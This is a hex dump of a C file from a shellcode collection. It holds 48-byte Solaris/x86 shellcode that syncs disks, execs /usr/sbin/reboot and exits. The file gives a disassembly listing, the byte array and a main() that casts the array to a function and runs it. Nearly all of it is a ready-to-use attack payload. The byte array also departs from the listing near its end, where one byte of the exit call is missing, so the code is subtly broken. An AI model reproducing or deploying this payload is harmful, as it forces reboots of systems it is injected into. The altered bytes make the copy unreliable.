00000000  2f 2a 0a 20 54 69 74 6c  65 3a 20 20 20 53 6f 6c  |/*. Title:   Sol|
00000010  61 72 69 73 2f 78 38 36  20 2d 20 53 79 6e 63 28  |aris/x86 - Sync(|
00000020  29 20 26 20 72 65 62 6f  6f 74 28 29 20 26 20 65  |) & reboot() & e|
00000030  78 69 74 28 30 29 20 2d  20 34 38 20 62 79 74 65  |xit(0) - 48 byte|
00000040  73 0a 20 41 75 74 68 6f  72 3a 20 20 4a 6f 6e 61  |s. Author:  Jona|
00000050  74 68 61 6e 20 53 61 6c  77 61 6e 20 3c 73 75 62  |than Salwan <sub|
00000060  6d 69 74 20 41 54 20 73  68 65 6c 6c 2d 73 74 6f  |mit AT shell-sto|
00000070  72 6d 2e 6f 72 67 3e 0a  20 57 65 62 3a 20 20 20  |rm.org>. Web:   |
00000080  20 20 68 74 74 70 3a 2f  2f 77 77 77 2e 73 68 65  |  http://www.she|
00000090  6c 6c 2d 73 74 6f 72 6d  2e 6f 72 67 0a 20 54 77  |ll-storm.org. Tw|
000000a0  69 74 74 65 72 3a 20 68  74 74 70 3a 2f 2f 74 77  |itter: http://tw|
000000b0  69 74 74 65 72 2e 63 6f  6d 2f 6a 6f 6e 61 74 68  |itter.com/jonath|
000000c0  61 6e 73 61 6c 77 61 6e  0a 0a 20 21 20 44 61 74  |ansalwan.. ! Dat|
000000d0  61 62 61 73 65 20 6f 66  20 73 68 65 6c 6c 63 6f  |abase of shellco|
000000e0  64 65 73 3a 20 68 74 74  70 3a 2f 2f 77 77 77 2e  |des: http://www.|
000000f0  73 68 65 6c 6c 2d 73 74  6f 72 6d 2e 6f 72 67 2f  |shell-storm.org/|
00000100  73 68 65 6c 6c 63 6f 64  65 2f 0a 0a 20 44 61 74  |shellcode/.. Dat|
00000110  65 3a 20 20 20 20 32 30  31 30 2d 30 36 2d 30 37  |e:    2010-06-07|
00000120  0a 20 54 65 73 74 65 64  3a 20 20 53 75 6e 4f 53  |. Tested:  SunOS|
00000130  20 6f 70 65 6e 73 6f 6c  61 72 69 73 20 35 2e 31  | opensolaris 5.1|
00000140  31 20 73 6e 76 5f 31 31  31 62 20 69 38 36 70 63  |1 snv_111b i86pc|
00000150  20 69 33 38 36 20 69 38  36 70 63 20 53 6f 6c 61  | i386 i86pc Sola|
00000160  72 69 73 0a 0a 20 20 20  20 30 78 38 30 34 38 30  |ris..    0x80480|
00000170  37 34 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |74:             |
00000180  20 33 31 20 63 30 20 20  20 20 20 20 20 20 20 20  | 31 c0          |
00000190  20 20 20 20 78 6f 72 6c  20 20 20 25 65 61 78 2c  |    xorl   %eax,|
000001a0  25 65 61 78 0a 20 20 20  20 30 78 38 30 34 38 30  |%eax.    0x80480|
000001b0  37 36 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |76:             |
000001c0  20 62 30 20 32 34 20 20  20 20 20 20 20 20 20 20  | b0 24          |
000001d0  20 20 20 20 6d 6f 76 62  20 20 20 24 30 78 32 34  |    movb   $0x24|
000001e0  2c 25 61 6c 0a 20 20 20  20 30 78 38 30 34 38 30  |,%al.    0x80480|
000001f0  37 38 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |78:             |
00000200  20 63 64 20 39 31 20 20  20 20 20 20 20 20 20 20  | cd 91          |
00000210  20 20 20 20 69 6e 74 20  20 20 20 24 30 78 39 31  |    int    $0x91|
00000220  0a 20 20 20 20 30 78 38  30 34 38 30 37 61 3a 20  |.    0x804807a: |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 33 31 20  |             31 |
00000240  63 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0              |
00000250  78 6f 72 6c 20 20 20 25  65 61 78 2c 25 65 61 78  |xorl   %eax,%eax|
00000260  0a 20 20 20 20 30 78 38  30 34 38 30 37 63 3a 20  |.    0x804807c: |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 35 30 20  |             50 |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  70 75 73 68 6c 20 20 25  65 61 78 0a 20 20 20 20  |pushl  %eax.    |
000002a0  30 78 38 30 34 38 30 37  64 3a 20 20 20 20 20 20  |0x804807d:      |
000002b0  20 20 20 20 20 20 20 20  36 38 20 36 32 20 36 66  |        68 62 6f|
000002c0  20 36 66 20 37 34 20 20  20 20 20 70 75 73 68 6c  | 6f 74     pushl|
000002d0  20 20 24 30 78 37 34 36  66 36 66 36 32 0a 20 20  |  $0x746f6f62.  |
000002e0  20 20 30 78 38 30 34 38  30 38 32 3a 20 20 20 20  |  0x8048082:    |
000002f0  20 20 20 20 20 20 20 20  20 20 36 38 20 36 65 20  |          68 6e |
00000300  32 66 20 37 32 20 36 35  20 20 20 20 20 70 75 73  |2f 72 65     pus|
00000310  68 6c 20 20 24 30 78 36  35 37 32 32 66 36 65 0a  |hl  $0x65722f6e.|
00000320  20 20 20 20 30 78 38 30  34 38 30 38 37 3a 20 20  |    0x8048087:  |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 36 38 20 32  |            68 2|
00000340  66 20 37 33 20 36 32 20  36 39 20 20 20 20 20 70  |f 73 62 69     p|
00000350  75 73 68 6c 20 20 24 30  78 36 39 36 32 37 33 32  |ushl  $0x6962732|
00000360  66 0a 20 20 20 20 30 78  38 30 34 38 30 38 63 3a  |f.    0x804808c:|
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 36 38  |              68|
00000380  20 32 66 20 37 35 20 37  33 20 37 32 20 20 20 20  | 2f 75 73 72    |
00000390  20 70 75 73 68 6c 20 20  24 30 78 37 32 37 33 37  | pushl  $0x72737|
000003a0  35 32 66 0a 20 20 20 20  30 78 38 30 34 38 30 39  |52f.    0x804809|
000003b0  31 3a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1:              |
000003c0  38 39 20 65 33 20 20 20  20 20 20 20 20 20 20 20  |89 e3           |
000003d0  20 20 20 6d 6f 76 6c 20  20 20 25 65 73 70 2c 25  |   movl   %esp,%|
000003e0  65 62 78 0a 20 20 20 20  30 78 38 30 34 38 30 39  |ebx.    0x804809|
000003f0  33 3a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3:              |
00000400  35 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |50              |
00000410  20 20 20 70 75 73 68 6c  20 20 25 65 61 78 0a 20  |   pushl  %eax. |
00000420  20 20 20 30 78 38 30 34  38 30 39 34 3a 20 20 20  |   0x8048094:   |
00000430  20 20 20 20 20 20 20 20  20 20 20 35 33 20 20 20  |           53   |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000450  73 68 6c 20 20 25 65 62  78 0a 20 20 20 20 30 78  |shl  %ebx.    0x|
00000460  38 30 34 38 30 39 35 3a  20 20 20 20 20 20 20 20  |8048095:        |
00000470  20 20 20 20 20 20 38 39  20 65 31 20 20 20 20 20  |      89 e1     |
00000480  20 20 20 20 20 20 20 20  20 6d 6f 76 6c 20 20 20  |         movl   |
00000490  25 65 73 70 2c 25 65 63  78 0a 20 20 20 20 30 78  |%esp,%ecx.    0x|
000004a0  38 30 34 38 30 39 37 3a  20 20 20 20 20 20 20 20  |8048097:        |
000004b0  20 20 20 20 20 20 35 30  20 20 20 20 20 20 20 20  |      50        |
000004c0  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
000004d0  25 65 61 78 0a 20 20 20  20 30 78 38 30 34 38 30  |%eax.    0x80480|
000004e0  39 38 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |98:             |
000004f0  20 35 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | 51             |
00000500  20 20 20 20 70 75 73 68  6c 20 20 25 65 63 78 0a  |    pushl  %ecx.|
00000510  20 20 20 20 30 78 38 30  34 38 30 39 39 3a 20 20  |    0x8048099:  |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 35 33 20 20  |            53  |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000540  75 73 68 6c 20 20 25 65  62 78 0a 20 20 20 20 30  |ushl  %ebx.    0|
00000550  78 38 30 34 38 30 39 61  3a 20 20 20 20 20 20 20  |x804809a:       |
00000560  20 20 20 20 20 20 20 62  30 20 30 62 20 20 20 20  |       b0 0b    |
00000570  20 20 20 20 20 20 20 20  20 20 6d 6f 76 62 20 20  |          movb  |
00000580  20 24 30 78 62 2c 25 61  6c 0a 20 20 20 20 30 78  | $0xb,%al.    0x|
00000590  38 30 34 38 30 39 63 3a  20 20 20 20 20 20 20 20  |804809c:        |
000005a0  20 20 20 20 20 20 35 30  20 20 20 20 20 20 20 20  |      50        |
000005b0  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
000005c0  25 65 61 78 0a 20 20 20  20 30 78 38 30 34 38 30  |%eax.    0x80480|
000005d0  39 64 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |9d:             |
000005e0  20 63 64 20 39 31 20 20  20 20 20 20 20 20 20 20  | cd 91          |
000005f0  20 20 20 20 69 6e 74 20  20 20 20 24 30 78 39 31  |    int    $0x91|
00000600  0a 20 20 20 20 30 78 38  30 34 38 30 39 66 3a 20  |.    0x804809f: |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 33 31 20  |             31 |
00000620  64 62 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |db              |
00000630  78 6f 72 6c 20 20 20 25  65 62 78 2c 25 65 62 78  |xorl   %ebx,%ebx|
00000640  0a 20 20 20 20 30 78 38  30 34 38 30 61 31 3a 20  |.    0x80480a1: |
00000650  20 20 20 20 20 20 20 20  20 20 20 20 20 62 30 20  |             b0 |
00000660  30 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |01              |
00000670  6d 6f 76 62 20 20 20 24  30 78 31 2c 25 61 6c 0a  |movb   $0x1,%al.|
00000680  20 20 20 20 30 78 38 30  34 38 30 61 33 3a 20 20  |    0x80480a3:  |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 63 64 20 39  |            cd 9|
000006a0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 69  |1              i|
000006b0  6e 74 20 20 20 20 24 30  78 39 31 0a 0a 0a 2a 2f  |nt    $0x91...*/|
000006c0  0a 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
000006d0  6f 2e 68 3e 0a 0a 63 68  61 72 20 73 63 5b 5d 20  |o.h>..char sc[] |
000006e0  3d 20 22 5c 78 33 31 5c  78 63 30 5c 78 62 30 5c  |= "\x31\xc0\xb0\|
000006f0  78 32 34 5c 78 63 64 5c  78 39 31 5c 78 33 31 5c  |x24\xcd\x91\x31\|
00000700  78 63 30 5c 78 35 30 5c  78 36 38 22 0a 20 20 20  |xc0\x50\x68".   |
00000710  20 20 20 20 20 20 20 20  20 22 5c 78 36 32 5c 78  |         "\x62\x|
00000720  36 66 5c 78 36 66 5c 78  37 34 5c 78 36 38 5c 78  |6f\x6f\x74\x68\x|
00000730  36 65 5c 78 32 66 5c 78  37 32 5c 78 36 35 5c 78  |6e\x2f\x72\x65\x|
00000740  36 38 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |68".            |
00000750  22 5c 78 32 66 5c 78 37  33 5c 78 36 32 5c 78 36  |"\x2f\x73\x62\x6|
00000760  39 5c 78 36 38 5c 78 32  66 5c 78 37 35 5c 78 37  |9\x68\x2f\x75\x7|
00000770  33 5c 78 37 32 5c 78 38  39 22 0a 20 20 20 20 20  |3\x72\x89".     |
00000780  20 20 20 20 20 20 20 22  5c 78 65 33 5c 78 35 30  |       "\xe3\x50|
00000790  5c 78 35 33 5c 78 38 39  5c 78 65 31 5c 78 35 30  |\x53\x89\xe1\x50|
000007a0  5c 78 35 31 5c 78 35 33  5c 78 62 30 5c 78 30 62  |\x51\x53\xb0\x0b|
000007b0  22 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |".            "\|
000007c0  78 35 30 5c 78 63 64 5c  78 39 31 5c 78 33 31 5c  |x50\xcd\x91\x31\|
000007d0  78 64 62 5c 78 62 30 5c  78 63 64 5c 78 39 31 22  |xdb\xb0\xcd\x91"|
000007e0  3b 0a 0a 0a 69 6e 74 20  6d 61 69 6e 28 76 6f 69  |;...int main(voi|
000007f0  64 29 0a 7b 0a 20 20 20  20 20 20 20 20 66 70 72  |d).{.        fpr|
00000800  69 6e 74 66 28 73 74 64  6f 75 74 2c 22 4c 65 6e  |intf(stdout,"Len|
00000810  67 74 68 3a 20 25 64 5c  6e 22 2c 73 74 72 6c 65  |gth: %d\n",strle|
00000820  6e 28 73 63 29 29 3b 0a  20 20 20 20 20 20 20 20  |n(sc));.        |
00000830  28 2a 28 76 6f 69 64 28  2a 29 28 29 29 20 73 63  |(*(void(*)()) sc|
00000840  29 28 29 3b 0a 0a 72 65  74 75 72 6e 20 30 3b 0a  |)();..return 0;.|
00000850  7d                                                |}|
00000851
